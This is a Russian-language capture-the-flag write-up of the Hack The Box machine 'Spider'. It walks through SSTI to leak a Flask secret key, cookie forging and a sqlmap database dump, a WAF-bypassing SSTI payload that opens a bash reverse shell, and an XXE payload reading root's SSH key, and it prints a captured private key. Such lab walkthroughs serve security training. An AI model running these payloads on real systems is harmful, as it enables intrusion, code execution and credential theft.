# Spider (2021)

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

## Ключевые моменты прохождения:

После скана nmap'a мы сможем увидеть два порта - 22(ssh) и 80(http). Полазив немного по сайту, мы найдем SSTI в форме регистрации, но ввод ограничен десятью символами. После прочитаем config шаблонизатора. Также мы можем определить сам шаблонизатор. Поняв, что на сайте используется либо flask либо jinja, мы используем flask-unsign для того, чтобы редактировать куки файлы. Далее с помощью всего, что мы знаем и умеем, вытащим 3 базы данных с помощью sqlmap'а.

## Разведка

По дефолту редачим `/etc/hosts`:

```console
$ sudo vim /etc/hosts
```

Сканим `nmap'ом`:

```console
$ nmap -sC -sV 10.10.10.243 -oN nmap
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to Zeta Furniture.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Форма регистрации:

<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

Также при регистрации выдается уникальный UUID (идентификатор):&#x20;

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

На вкладке http://spider.htb/user есть информация об аккаунте:&#x20;

<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

## Получаем юзера

Ввод юзернейма ограничен 10-ю символами, поэтому мы можем использовать дефолтный для `SSTI <div data-gb-custom-block data-tag="raw">{{config}}`:

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

Теперь на вкладке `http://spider.htb/user` можно увидеть вывод пэйлоада:

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Весь конфиг:

```
<Config {'ENV': 'production'
'DEBUG': False
'TESTING': False
'PROPAGATE_EXCEPTIONS': None
'PRESERVE_CONTEXT_ON_EXCEPTION': None
'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31)
'USE_X_SENDFILE': False
'SERVER_NAME': None
'APPLICATION_ROOT': '/'
'SESSION_COOKIE_NAME': 'session'
'SESSION_COOKIE_DOMAIN': False
'SESSION_COOKIE_PATH': None
'SESSION_COOKIE_HTTPONLY': True
'SESSION_COOKIE_SECURE': False
'SESSION_COOKIE_SAMESITE': None
'SESSION_REFRESH_EACH_REQUEST': True
'MAX_CONTENT_LENGTH': None
'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0
43200)
'TRAP_BAD_REQUEST_ERRORS': None
'TRAP_HTTP_EXCEPTIONS': False
'EXPLAIN_TEMPLATE_LOADING': False
'PREFERRED_URL_SCHEME': 'http'
'JSON_AS_ASCII': True
'JSON_SORT_KEYS': True
'JSONIFY_PRETTYPRINT_REGULAR': False
'JSONIFY_MIMETYPE': 'application/json'
'TEMPLATES_AUTO_RELOAD': None
'MAX_COOKIE_SIZE': 4093
'RATELIMIT_ENABLED': True
'RATELIMIT_DEFAULTS_PER_METHOD': False
'RATELIMIT_SWALLOW_ERRORS': False
'RATELIMIT_HEADERS_ENABLED': False
'RATELIMIT_STORAGE_URL': 'memory://'
'RATELIMIT_STRATEGY': 'fixed-window'
'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset'
'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining'
'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit'
'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After'
'UPLOAD_FOLDER': 'static/uploads'}>
```

В данном случае нам интересно только это:

```
'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
```

Также нам нужно определить, что используется в качестве шаблонизатора:

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

Исходя из всего этого, можно понять, что на сайте используется либо `flask` либо `Jinja`. Нужно использовать `flask-unsign` для манипуляций над куки файлами. Это инструмент командной строки для извлечения, декодирования, перебора и создания файлов `cookie` для приложения `Flask`.

```console
$ pip3 install flask_unsign
```

При ошибке:

```
bash: pip3: command not found
```

```console
$ sudo apt-get install python3-pip
```

После этого можно раскодировать и закодировать куки с помощью `SECRET_KEY`:

```
$ flask-unsign --decode --cookie "eyJjYXJ0X2l0ZW1zIjpbIjQiXSwidXVpZCI6IjEyNDgyMjJjLTkzZjgtNDI3MS1hNGRkLTQyNjVlMGJkZTQyZSJ9.YYJzEg.bLLc7CZe1WUg5eNCoKQQ39_IZG8"
```

```
{'cart_items': ['4'], 'uuid': '1248222c-93f8-4271-a4dd-4265e0bde42e'}
```

Также можно вытащить базу данных путем `SQL-инъекции`:

```console
$ sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump
```

```
custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'.
Do you want to process it? [Y/n/q] Y

you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours.
Do you want to merge them in further requests? [Y/n] n

[00:01:58] [INFO] testing if (custom) HEADER parameter 'Cookie #1*' is dynamic do you want to URL encode cookie values (implementation specific)? [Y/n] n

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

(custom) HEADER parameter 'Cookie #1*' is vulnerable.
Do you want to keep testing the others (if any)? [y/N] y
```

<figure><img src="../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

&#x20; ![](<../../../.gitbook/assets/image (125).png>)

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

&#x20;    Портал защищен WAF-ом:&#x20;

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

`WAF` - Web Application Firewall. На сервере выполняет функцию защиты от `DDoS`, а также разных типовых атак. Чаще всего, для его обхода нужно кодировать символы.

Поэтому можно воспользоваться данным пэйлоадом:

```python
{% raw %}{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi85ODk4IDA+JjEK | base64 -d | bash")["read"]() %} a {% endwith %}{% endraw %}
```

В `base64` нужно зашифровать пэйлоад:

```console
$ echo 'bash -i >& /dev/tcp/10.10.16.36/9898 0>&1' |base64
```

Для получения сессии:

```console
$ nc -nlvp 9898
```

```console
$ cat /home/chiv/.ssh/id_rsa
```

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END OPENSSH PRIVATE KEY-----
```

```console
$ vim id_rsa
$ chmod 400 id_rsa
$ ssh -i id_rsa chiv@spider.htb
```

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

## Получаем рута

Смотрим порты:

```console
$ netstat -ntlp
```

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

&#x20;Пробросим порт:

```console
$ ssh -i id_rsa -L 8000:localhost:8080 chiv@spider.htb
```

Часто новички в ИБ путают порты в пробросе. Слева тот порт, который пробрасывается для себя, а справа порт сервиса на удаленной машине. То есть: это наш порт --->8000:localhost:8080<--- это порт на удаленной машине

При входе на сайт нас встречает окно с логином:&#x20;

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

Пошарив по сайту, можно обнаружить `XXE` уязвимость.

`XXE` - `External Entity Attack`, то есть инъекция внешних сущностей XML.

XXE находится в куках, если их расшифровать с помощью `flask-unsign`, а потом расшифровать в `Base64`:

```console
$ flask-unsign -d --cookie ".eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz_zI8_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YZaxVQ.UneH3NWTuZ7SJ2Xkr7GxEtOU5Ss"
```

```
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=', 'points': 0}
```

```console
$ echo "PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=" | base64 -d
```

```xml
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>123</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

C помощью данного пэйлоада через `BurpSuite` можно получить `id_rsa` рута:

```
username=&foo;&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+foo+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

Повторяем те же действия, что и с `id_rsa` `chiv'а` и подключаемся:

```console
$ ssh -i id_rsa_root root@spider.htb
```

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
